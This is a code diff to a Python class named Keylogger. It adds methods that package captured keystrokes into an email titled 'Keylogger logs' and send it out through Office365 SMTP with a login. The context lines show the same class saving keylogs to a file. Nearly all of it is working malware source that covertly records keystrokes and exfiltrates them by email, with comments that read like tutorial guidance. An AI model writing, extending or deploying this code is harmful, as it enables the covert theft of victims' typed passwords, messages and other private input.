@@ -65,3 +65,38 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+
+    """Utility function to construct a MIMEMultipart from a text
+        It creates an HTML version as well as text version
+        to be sent as an email"""
+    def prepare_mail(self, message):
+        msg = MIMEMultipart("alternative")
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
+        # simple paragraph, feel free to edit
+        html = f"<p>{message}</p>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        # after making the mail, convert back as string message
+        return msg.as_string()
+
+    def sendmail(self, email, password, message, verbose=1):
+        # manages a connection to an SMTP server
+        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message after preparation
+        server.sendmail(email, email, self.prepare_mail(message))
+        # terminates the session
+        server.quit()
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+
+
+    
